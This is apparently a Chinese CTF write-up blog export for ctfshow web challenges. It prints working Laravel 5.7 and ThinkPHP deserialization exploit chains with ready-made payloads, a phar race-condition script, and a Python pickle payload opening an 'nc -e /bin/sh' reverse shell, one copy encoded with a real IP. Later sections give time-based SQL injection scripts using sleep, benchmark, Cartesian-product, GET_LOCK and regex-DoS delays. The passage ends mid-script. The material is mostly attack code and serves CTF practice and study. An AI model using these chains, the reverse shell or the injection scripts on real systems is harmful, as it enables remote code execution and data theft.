title="laravel5.7反序列化漏洞"></a>laravel5.7反序列化漏洞</h3><p>poc：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpnamespace Illuminate\Foundation\Testing &#123;    class PendingCommand    &#123;        public $test;        protected $app;        protected $command;        protected $parameters;        public function __construct($test, $app, $command, $parameters)        &#123;            $this-&gt;test &#x3D; $test;                 &#x2F;&#x2F;一个实例化的类 Illuminate\Auth\GenericUser            $this-&gt;app &#x3D; $app;                   &#x2F;&#x2F;一个实例化的类 Illuminate\Foundation\Application            $this-&gt;command &#x3D; $command;           &#x2F;&#x2F;要执行的php函数 system            $this-&gt;parameters &#x3D; $parameters;     &#x2F;&#x2F;要执行的php函数的参数  array(&#39;id&#39;)        &#125;    &#125;&#125;namespace Faker &#123;    class DefaultGenerator    &#123;        protected $default;        public function __construct($default &#x3D; null)        &#123;            $this-&gt;default &#x3D; $default;        &#125;    &#125;&#125;namespace Illuminate\Foundation &#123;    class Application    &#123;        protected $instances &#x3D; [];        public function __construct($instances &#x3D; [])        &#123;            $this-&gt;instances[&#39;Illuminate\Contracts\Console\Kernel&#39;] &#x3D; $instances;        &#125;    &#125;&#125;namespace &#123;    $defaultgenerator &#x3D; new Faker\DefaultGenerator(array(&quot;hello&quot; &#x3D;&gt; &quot;world&quot;));    $app &#x3D; new Illuminate\Foundation\Application();    $application &#x3D; new Illuminate\Foundation\Application($app);    $pendingcommand &#x3D; new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, &#39;system&#39;, array(&#39;cat &#x2F;flag&#39;));    echo urlencode(serialize($pendingcommand));&#125;</code></pre><p>post data中传入参数即可</p><h1 id="web272、web273"><a href="#web272、web273" class="headerlink" title="web272、web273"></a>web272、web273</h1><p>poc：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;*Author:monitordescription:    laravel deserialization chain*&#x2F;namespace Illuminate\Broadcasting&#123;    class PendingBroadcast&#123;        protected $events;        protected $event;        public function __construct($events,$event)        &#123;            $this-&gt;events &#x3D; $events;            $this-&gt;event &#x3D; $event;        &#125;    &#125;&#125;namespace Illuminate\Bus&#123;    class Dispatcher&#123;        protected $queueResolver;        public function __construct($queueResolver)        &#123;            $this-&gt;queueResolver &#x3D; $queueResolver;        &#125;    &#125;&#125;namespace Mockery\Loader&#123;    class EvalLoader&#123;    &#125;&#125;namespace Mockery\Generator&#123;    class MockDefinition&#123;        protected $config;        protected $code;        public function __construct($config,$code)&#123;            $this-&gt;config &#x3D; $config;            $this-&gt;code &#x3D; $code;        &#125;    &#125;    class MockConfiguration&#123;        protected $name;        public function __construct($name)        &#123;            $this-&gt;name &#x3D; $name;        &#125;    &#125;&#125;namespace Illuminate\Queue&#123;    class CallQueuedClosure&#123;        public $connection;        public function __construct($connection)        &#123;            $this-&gt;connection &#x3D; $connection;        &#125;    &#125;&#125;namespace&#123;       if($argc&lt;2)&#123;        echo &quot;Description:\n\tUse laravel deserialization to eval php code,don&#39;t need to input php tags.&quot;;        echo &quot;\nUsage:&quot; .$argv[0] . &quot; &lt;code&gt;&quot;;        exit();    &#125;    $code &#x3D; $argv[1];    $mockconfiguration &#x3D; new Mockery\Generator\MockConfiguration(&quot;pass&quot;);    $mockdefination &#x3D; new Mockery\Generator\MockDefinition($mockconfiguration,&quot;&lt;?php &quot;.$code.&quot; exit;?&gt;&quot;);    $callqueuedclosure &#x3D; new Illuminate\Queue\CallQueuedClosure($mockdefination);    $evaload &#x3D; new Mockery\Loader\EvalLoader();    $dispatcher &#x3D; new Illuminate\Bus\Dispatcher(array($evaload,&quot;load&quot;));    $pendingbroadcast &#x3D; new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$callqueuedclosure);    echo urlencode(serialize($pendingbroadcast));&#125;</code></pre><p>或者：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpnamespace Illuminate\Broadcasting&#123;    use Illuminate\Bus\Dispatcher;    use Illuminate\Foundation\Console\QueuedCommand;    class PendingBroadcast    &#123;        protected $events;        protected $event;        public function __construct()&#123;            $this-&gt;events&#x3D;new Dispatcher();            $this-&gt;event&#x3D;new QueuedCommand();        &#125;    &#125;&#125;namespace Illuminate\Foundation\Console&#123;    use Mockery\Generator\MockDefinition;    class QueuedCommand    &#123;        public $connection;        public function __construct()&#123;            $this-&gt;connection&#x3D;new MockDefinition();        &#125;    &#125;&#125;namespace Illuminate\Bus&#123;    use Mockery\Loader\EvalLoader;    class Dispatcher    &#123;        protected $queueResolver;        public function __construct()&#123;            $this-&gt;queueResolver&#x3D;[new EvalLoader(),&#39;load&#39;];        &#125;    &#125;&#125;namespace Mockery\Loader&#123;    class EvalLoader    &#123;    &#125;&#125;namespace Mockery\Generator&#123;    class MockDefinition    &#123;        protected $config;        protected $code;        public function __construct()        &#123;            $this-&gt;code&#x3D;&quot;&lt;?php system(&#39;cat &#x2F;f*&#39;);exit()?&gt;&quot;; &#x2F;&#x2F;此处是PHP代码            $this-&gt;config&#x3D;new MockConfiguration();        &#125;    &#125;    class MockConfiguration    &#123;        protected $name&#x3D;&quot;feng&quot;;    &#125;&#125;namespace&#123;    use Illuminate\Broadcasting\PendingBroadcast;    echo urlencode(serialize(new PendingBroadcast()));&#125;</code></pre><p>payload:</p><pre class="language-php" data-language="php"><code class="language-php">data&#x3D;O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A35%3A%22Mockery%5CGenerator%5CMockConfiguration%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A4%3A%22feng%22%3B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A32%3A%22%3C%3Fphp+system%28%27cat+%2Ff%2A%27%29%3Bexit%28%29%3F%3E%22%3B%7D%7D%7D</code></pre><h1 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h1><blockquote><p><a href="https://xz.aliyun.com/t/6619#toc-1">https://xz.aliyun.com/t/6619#toc-1</a></p></blockquote><h3 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h3><p>老顾客</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpnamespace think;abstract class Model&#123;    protected $append &#x3D; [];    private $data &#x3D; [];    function __construct()&#123;        $this-&gt;append &#x3D; [&quot;lin&quot;&#x3D;&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]];        $this-&gt;data &#x3D; [&quot;lin&quot;&#x3D;&gt;new Request()];    &#125;&#125;class Request&#123;    protected $hook &#x3D; [];    protected $filter &#x3D; &quot;system&quot;; &#x2F;&#x2F;PHP函数    protected $config &#x3D; [        &#x2F;&#x2F; 表单ajax伪装变量        &#39;var_ajax&#39;         &#x3D;&gt; &#39;_ajax&#39;,      ];    function __construct()&#123;        $this-&gt;filter &#x3D; &quot;system&quot;;        $this-&gt;config &#x3D; [&quot;var_ajax&quot;&#x3D;&gt;&#39;lin&#39;]; &#x2F;&#x2F;PHP函数的参数        $this-&gt;hook &#x3D; [&quot;visible&quot;&#x3D;&gt;[$this,&quot;isAjax&quot;]];    &#125;&#125;namespace think\process\pipes;use think\model\concern\Conversion;use think\model\Pivot;class Windows&#123;    private $files &#x3D; [];    public function __construct()    &#123;        $this-&gt;files&#x3D;[new Pivot()];    &#125;&#125;namespace think\model;use think\Model;class Pivot extends Model&#123;&#125;use think\process\pipes\Windows;echo base64_encode(serialize(new Windows()));?&gt;</code></pre><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">&#x2F;?lin&#x3D;cat &#x2F;f*&amp;data&#x3D;TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19</code></pre><p>lin中传入命令，data传入反序列化<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690629861855-a14768bf-7926-4b4e-8c0a-4e9fd1154539.png" alt="image.png"></p><h1 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h1><p><code>__destruct</code>当对象被销毁时调用，所以我们不需要用到反序列化函数。那么只要<code>$this-&gt;evilfile</code>是true就可以执行系统命令了。<br>payload：</p><pre class="language-php" data-language="php"><code class="language-php">?fn&#x3D;;cat f*post: flag&#x3D;123</code></pre><h1 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h1><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/110558192">https://blog.csdn.net/miuzzx/article/details/110558192</a></p></blockquote><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>晚上挺不住，放一下别人payload：<br>在上个题的基础上增了了 判断$this-&gt;admin所以真的需要我们去通过反序列化修改admin的值了。因为题目中没有反序列化函数，所以需要通过其他方式。<br>因为题目中有写文件的函数，所以可以通过file_put_contents写phar文件，然后再通过file_put_contents触发phar反序列化。当然我们得在删除文件前执行完这两个操作，所以需要用到条件竞争。<br>生成phar：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass filter&#123;    public $filename &#x3D; &quot;1|cat f*&quot;;    public $filecontent;    public $evilfile &#x3D; true;    public $admin &#x3D; true;&#125;$phar &#x3D; new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o &#x3D; new filter();$phar-&gt;setMetadata($o);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();</code></pre><p>条件竞争：</p><pre class="language-php" data-language="php"><code class="language-php">import requestsimport threadingimport base64url &#x3D; &#39;http:&#x2F;&#x2F;b1238473-a3bb-431f-a39e-3cd285bcb95e.chall.ctf.show&#x2F;&#39;f &#x3D; open(&#39;.&#x2F;phar.phar&#39;, &#39;rb&#39;)data &#x3D; f.read()flag &#x3D; Falsedef work1():    requests.post(url+&quot;?fn&#x3D;a&quot;, data&#x3D;data)def work2():    global flag    r &#x3D; requests.post(url+&quot;?fn&#x3D;phar:&#x2F;&#x2F;phar.phar&#x2F;&quot;, data&#x3D;&quot;&quot;)    if &quot;flag&#123;&quot; in r.text and flag is False:        print(base64.b64encode(r.text.encode()))        flag &#x3D; Truewhile flag is False:    a &#x3D; threading.Thread(target&#x3D;work1)    b &#x3D; threading.Thread(target&#x3D;work2)    a.start()    b.start()</code></pre><h1 id="web277、web278"><a href="#web277、web278" class="headerlink" title="web277、web278"></a>web277、web278</h1><pre class="language-php" data-language="php"><code class="language-php">import pickleimport base64class A(object):def __reduce__(self):return(eval,(&#39;__import__(&quot;os&quot;).popen(&quot;nc xxx.xxx.xxx.xxx 4567 -e &#x2F;bin&#x2F;sh&quot;).read()&#39;,))a&#x3D;A()test&#x3D;pickle.dumps(a)print(base64.b64encode(test))</code></pre><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">&#x2F;backdoor?data&#x3D;gASVXwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxDX19pbXBvcnRfXygib3MiKS5wb3BlbigibmMgMTAxLjIwMC4xNTkuMTE5IDg4ODggLWUgL2Jpbi9zaCIpLnJlYWQoKZSFlFKULg&#x3D;&#x3D;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690630246109-15f492ce-0561-499f-9588-24e51f9017a4.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web214-web253SQL注入篇（三）</title>
      <link href="/posts/d6dc50dc/"/>
      <url>/posts/d6dc50dc/</url>
      
        <content type="html"><![CDATA[<h1 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h1><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>终于知道是哪来的注入点了，在主页的网络包中有一个<code>select.js</code>中能看到：</p><pre class="language-json" data-language="json"><code class="language-json">$.ajax(&#123;  url:&#39;api&#x2F;&#39;,  dataType:&quot;json&quot;,  type:&#39;post&#39;,  data:&#123;    ip:returnCitySN[&quot;cip&quot;],    debug:0  &#125;&#125;);</code></pre><p>向其中可以存在注入点。<br>hackbar测试一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689282687265-a4a97ad1-82db-4165-ba3f-d36f1b9c060b.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689282697392-c201a11b-9f33-4447-837e-6f89afbcd904.png" alt="image.png"><br>有sql执行，继续构建测试payload：</p><pre class="language-plsql" data-language="plsql"><code class="language-plsql">ip&#x3D;if(substr(database(),1,1)&#x3D;(&#39;c&#39;),sleep(5),1)&amp;debug&#x3D;0</code></pre><p>然后就是写脚本<br>先贴一下佬们的脚本：</p><pre class="language-plsql" data-language="plsql"><code class="language-plsql">&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;d23ee9e9-3e43-4b0a-b172-547561ea456d.chall.ctf.show&#x2F;api&#x2F;&quot;result &#x3D; &quot;&quot;i &#x3D; 0while True:    i &#x3D; i + 1    head &#x3D; 32    tail &#x3D; 127    while head &lt; tail:        mid &#x3D; (head + tail) &gt;&gt; 1        # 查数据库        # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;        # 查列名字-id.flag        # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagx&#39;&quot;        # 查数据        payload &#x3D; &quot;select flaga from ctfshow_flagx&quot;        data &#x3D; &#123;            &#39;ip&#39;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;,            &#39;debug&#39;:&#39;0&#39;        &#125;        try:            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)            tail &#x3D; mid        except Exception as e:            head &#x3D; mid + 1    if head !&#x3D; 32:        result +&#x3D; chr(head)    else:        break    print(result)</code></pre><p>我的脚本：</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL时间盲注1.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;14 5:20   natro92      1.0         None&quot;&quot;&quot;import requestsurl &#x3D; r&#39;http:&#x2F;&#x2F;6ec95228-b921-42dc-ba05-78d8a7decd79.challenge.ctf.show&#x2F;api&#x2F;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_-&#125; &quot;# inside &#x3D; &#39;database()&#39;# inside &#x3D; &#39;select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()&#39;# inside &#x3D; &#39;select group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;ctfshow_flagx&quot;&#39;inside &#x3D; &#39;select group_concat(flaga) from ctfshow_flagx&#39;payload &#x3D; &#39;if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;(&quot;&#123;&#125;&quot;),sleep(1),1)&#39;res &#x3D; &#39;&#39;last &#x3D; &#39; &#39;for i in range(1, 100):    for j in str:        data &#x3D; &#123;            &#39;ip&#39;: payload.format(inside, i, j),            &#39;debug&#39;: 0        &#125;        # 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调        try:            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)        except Exception as e:            last &#x3D; res            res +&#x3D; j            break        if last &#x3D;&#x3D; res.replace(&#39; &#39;,&#39;&#39;):            exit()    print(res)</code></pre><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>substr这个函数不从0开始，从1开始。别傻乎乎的用错了。<br>可以用try来做一个微调，如果出现问题就可以自己修改。<br>注意要传的是<code>/api/</code>不是<code>/api</code>传错了可没有回显</p><h1 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h1><p>提示用了单引号，得闭合一下就行<br>测试payload：</p><pre class="language-python" data-language="python"><code class="language-python">ip&#x3D;1&#39; or sleep(3) and &#39;1&#39;&#x3D;&#39;1&amp;debug&#x3D;0或者ip&#x3D;1&#39; or sleep(3) #&amp;debug&#x3D;0</code></pre><p>修改脚本：</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL时间盲注1.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;14 5:20   natro92      1.0         None&quot;&quot;&quot;import requestsurl &#x3D; r&#39;http:&#x2F;&#x2F;8f775fc1-f6d1-431e-9ac4-93ab0f082a11.challenge.ctf.show&#x2F;api&#x2F;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_-&#125; &quot;# inside &#x3D; &#39;database()&#39;# inside &#x3D; &#39;select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()&#39;# inside &#x3D; &#39;select group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;ctfshow_flagxc&quot;&#39;inside &#x3D; &#39;select group_concat(flagaa) from ctfshow_flagxc&#39;payload &#x3D; &quot;1&#39; or if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),sleep(1),1)#&quot;res &#x3D; &#39;&#39;last &#x3D; &#39; &#39;for i in range(1, 100):    for j in str:        data &#x3D; &#123;            &#39;ip&#39;: payload.format(inside, i, j),            &#39;debug&#39;: 0        &#125;        # 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调        try:            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)        except Exception as e:            last &#x3D; res            res +&#x3D; j            break        if last &#x3D;&#x3D; res.replace(&#39; &#39;,&#39;&#39;):            exit()    print(res)</code></pre><h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>操作可以快一点，用一点快捷键。<br>pycharm中搜索快捷键<code>ctrl + f</code>，替换快捷键<code>ctrl + r</code>。<br>搜索中修改正则：</p><pre class="language-python" data-language="python"><code class="language-python">http:&#x2F;&#x2F;[a-zA-Z0-9-.&#x2F;]+</code></pre><p>然后替换写入新网址，这样就能快一点</p><h1 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h1><h3 id="from-base64-id"><a href="#from-base64-id" class="headerlink" title="from_base64($id)"></a>from_base64($id)</h3><p>加了一个查询：</p><pre class="language-python" data-language="python"><code class="language-python">where id &#x3D; from_base64($id);</code></pre><p>只需要把1的base64 <code>MQ==</code>，添加的到原payload中：</p><pre class="language-python" data-language="python"><code class="language-python">ip&#x3D;&#39;MQ&#x3D;&#x3D;&#39;) or sleep(3) and &#39;1&#39;&#x3D;&#39;1&amp;debug&#x3D;0</code></pre><h1 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h1><h3 id="benchmark函数的时间盲注"><a href="#benchmark函数的时间盲注" class="headerlink" title="benchmark函数的时间盲注"></a>benchmark函数的时间盲注</h3><p>加了个过滤，把sleep给ban了，可以用benchmark代替。<br>BENCHMARK是SQL中的一个函数,主要用于测试SQL语句的执行效率。其语法如下:</p><pre class="language-python" data-language="python"><code class="language-python">BENCHMARK(count, expr)</code></pre><p>其中count表示重复执行expr的次数。<br>这里的测试如下：</p><pre class="language-python" data-language="python"><code class="language-python">ip&#x3D;1) and benchmark(500000,sha(1))#&amp;debug&#x3D;0</code></pre><p>由于网络环境不同，需要根据情况下微调timeout的值：<br>这里我有点没太明白的点在于，为什么调用database函数时和查询时相同benchmark的延迟差很多</p><pre class="language-python" data-language="python"><code class="language-python">比如ip&#x3D;1) or if(substr((database()),1,1)&#x3D;(&#39;c&#39;),benchmark(500000,sha(1)),1)#&amp;debug&#x3D;0有1.45s而ip&#x3D;1) or if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1)&#x3D;(&#39;c&#39;),benchmark(3500000,sha(1)),1)#&amp;debug&#x3D;0是1.72s</code></pre><p>因此次数在脚本中需要多次调试。<br>而且由于这个时间是随着运行时间增长而会导致越到后面越不准确。<br>因此可以用limit关键字对flag进行分割。</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL时间盲注1.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;14 5:20   natro92      1.0         None&quot;&quot;&quot;import timeimport requestsurl &#x3D; r&#39;http:&#x2F;&#x2F;b78d98e8-2199-4723-bf89-18fed148eb42.challenge.ctf.show&#x2F;api&#x2F;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125; &quot;# inside &#x3D; &#39;database()&#39;# inside &#x3D; &#39;select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()&#39;# inside &#x3D; &#39;select group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;ctfshow_flagxccb&quot;&#39;inside &#x3D; &#39;substr((select group_concat(flagaabc) from ctfshow_flagxccb),9,36)&#39;payload &#x3D; &quot;1) or if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),benchmark(2500000,sha(1)),1)#&quot;res &#x3D; &#39;&#39;last &#x3D; &#39; &#39;for i in range(1, 100):    for j in str:        data &#x3D; &#123;            &#39;ip&#39;: payload.format(inside, i, j),            &#39;debug&#39;: 0        &#125;        # 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调        try:            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)        except Exception as e:            last &#x3D; res            res +&#x3D; j            break        if last &#x3D;&#x3D; res.replace(&#39; &#39;,&#39;&#39;):            exit()        time.sleep(1)    print(res)</code></pre><p>观察之前的flag<br><code>ctfshow&#123;c059a105-e0f9-41b5-a49e-002ac179386a&#125;</code><br>从第九位开始七位，从17开始10位 从28开始12位</p><pre class="language-python" data-language="python"><code class="language-python">44n3955e-cec3-4c84-bb3f-91f5caab1040&#125;ctfshow&#123;44n3955e-cec3-4c84-bb3f-91f5caab1040&#125;44239p5d-cec3-4c84-bb3f-91f5caab1040fb4443955d</code></pre><p>这道太折磨人了做的要死了。 我操了 注三遍三个结果，破b脚本跑了3个小时，还是用大佬们的二分法跑吧，这个也太慢了。</p><h2 id="其他的时间盲注骚姿势"><a href="#其他的时间盲注骚姿势" class="headerlink" title="其他的时间盲注骚姿势"></a>其他的时间盲注骚姿势</h2><blockquote><p><a href="https://xz.aliyun.com/t/5505">https://xz.aliyun.com/t/5505</a></p></blockquote><h3 id="笛卡尔积盲注"><a href="#笛卡尔积盲注" class="headerlink" title="笛卡尔积盲注"></a>笛卡尔积盲注</h3><p>注入姿势</p><pre class="language-python" data-language="python"><code class="language-python">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;+-----------+| count(*)  |+-----------+| 113101560 |+-----------+1 row in set (2.07 sec)  mysql&gt; select  from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and (SELECT count() FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);+------+-----+| user | pwd |+------+-----+| 1    | 0   |+------+-----+1 row in set (2.08 sec)mysql&gt; select  from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;0 and (SELECT count() FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);Empty set (0.01 sec)</code></pre><p>利用and短路运算规则进行时间盲注。</p><h3 id="GET-LOCK盲注"><a href="#GET-LOCK盲注" class="headerlink" title="GET_LOCK盲注"></a>GET_LOCK盲注</h3><p>get_lock函数官方文档中的介绍<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689289973207-90f19c56-353b-4128-8a5c-9b65198645bf.png" alt="ZZAQbT.md.png"><br>可以看出文档中写的是我们如果已经开了一个session，对关键字进行了get_lock,那么再开另一个session再次对关键进行get_lock，就会延时我们指定的时间。<br>此盲注手法有一些限制，就是必须要同时开两个SESSION进行注入<br>SESSION A</p><pre class="language-python" data-language="python"><code class="language-python">mysql&gt; select get_lock(&#39;lihuaiqiu&#39;,1);+-------------------------+| get_lock(&#39;lihuaiqiu&#39;,1) |+-------------------------+|                       1 |+-------------------------+1 row in set (0.00 sec)</code></pre><p>SESSION B</p><pre class="language-python" data-language="python"><code class="language-python">mysql&gt; select get_lock(&#39;lihuaiqiu&#39;,5);+-------------------------+| get_lock(&#39;lihuaiqiu&#39;,5) |+-------------------------+|                       0 |+-------------------------+1 row in set (5.00 sec) mysql&gt; select * from ctf_test where user&#x3D;&#39;0&#39; and 1&#x3D;1 and  get_lock(&#39;lihuaiqiu&#39;,2);Empty set (2.00 sec)mysql&gt; select * from ctf_test where user&#x3D;&#39;0&#39; and 1&#x3D;0 and  get_lock(&#39;lihuaiqiu&#39;,2);Empty set (0.00 sec)</code></pre><p>同样的盲注利用手法。</p><h3 id="正则DOS-RLIKE注入"><a href="#正则DOS-RLIKE注入" class="headerlink" title="正则DOS RLIKE注入"></a>正则DOS RLIKE注入</h3><p>延时原理，利用SQL多次计算正则消耗计算资源产生延时效果，其实原理是和我们的benchmark注入差不多的。<br>利用手法</p><pre class="language-python" data-language="python"><code class="language-python">mysql&gt; select  from flag where flag&#x3D;&#39;1&#39; and if(mid(user(),1,1)&#x3D;&#39;s&#39;,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+b&#39;,1);+------+| flag |+------+| 1    |+------+1 row in set (0.00 sec)mysql&gt; select  from flag where flag&#x3D;&#39;1&#39; and if(mid(user(),1,1)&#x3D;&#39;r&#39;,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+cd&#39;,1);Empty set (3.83 sec)</code></pre><h1 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h1><h3 id="笛卡尔乘积"><a href="#笛卡尔乘积" class="headerlink" title="笛卡尔乘积"></a>笛卡尔乘积</h3><p>benchmark也被禁用了，用笛卡尔积运算来达到延迟的目的<br>主要的语句是：</p><pre class="language-python" data-language="python"><code class="language-python">SELECT count(*) FROM information_schema.columns A, information_schema.columns B</code></pre><p>拼接到payload里面测试一下：<br>不够就一直加，加到有延迟为止。<br>就不一点点爆了，直接梭。</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL时间盲注1.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;14 5:20   natro92      1.0         